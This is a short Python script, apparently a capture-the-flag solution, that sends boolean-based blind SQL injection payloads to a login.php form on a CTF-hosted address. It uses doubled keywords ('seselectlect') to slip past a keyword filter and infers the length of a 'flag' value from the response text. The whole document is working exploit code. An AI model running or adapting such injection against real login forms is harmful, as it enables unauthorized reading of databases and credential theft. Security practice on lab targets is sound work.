# coding:utf-8

import requests
import string

dic = string.digits + string.ascii_letters + "!@#$%^&*()_+{}-="
right = '8bef'
worry = '5728'
url = 'http://eci-2ze8v5kgperd619475pv.cloudeci1.ichunqiu.com/login.php'
for i in range(60):
    key = "admin' and " + "length((seselectlect flag FROM fl4g limit 0,1))=" + str(i) + "#"
    data = {'name': key, 'pass': '111'}
    r = requests.post(url, data=data).text
    # print(r)
    if right in str(r):
        print('the length of column is %s' % i)

